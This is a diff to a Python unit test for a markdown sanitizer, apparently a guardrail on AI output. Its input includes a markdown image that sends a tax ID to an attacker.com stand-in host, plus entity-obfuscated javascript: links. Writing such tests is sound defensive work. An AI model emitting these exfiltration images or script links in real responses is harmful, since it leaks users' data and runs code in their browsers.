@@ -319,6 +319,8 @@ class October2026GuardrailHardeningTests(unittest.TestCase):
             "![exfil](https://ura.go.ug.attacker.com/steal?tin=1) "
             "and [Click here](javascript:alert(1)) "
             "and [Entity](&#106;avascript:alert(1)) "
+            "and [MidEntity](java&#115;cript:alert(1)) "
+            "and [NamedColon](javascript&colon;alert(1)) "
             "and ![logo](https://ura.go.ug/logo.png).\n"
             "[ref1]: javascript:alert(2)"
         )
@@ -326,6 +328,8 @@ class October2026GuardrailHardeningTests(unittest.TestCase):
         self.assertIn("[link removed]", clean)
         self.assertIn("Click here ([unsafe link removed])", clean)
         self.assertIn("Entity ([unsafe link removed])", clean)
+        self.assertIn("MidEntity ([unsafe link removed])", clean)
+        self.assertIn("NamedColon ([unsafe link removed])", clean)
         self.assertIn("[unsafe link definition removed]", clean)
         self.assertIn("![logo](https://ura.go.ug/logo.png)", clean)
 
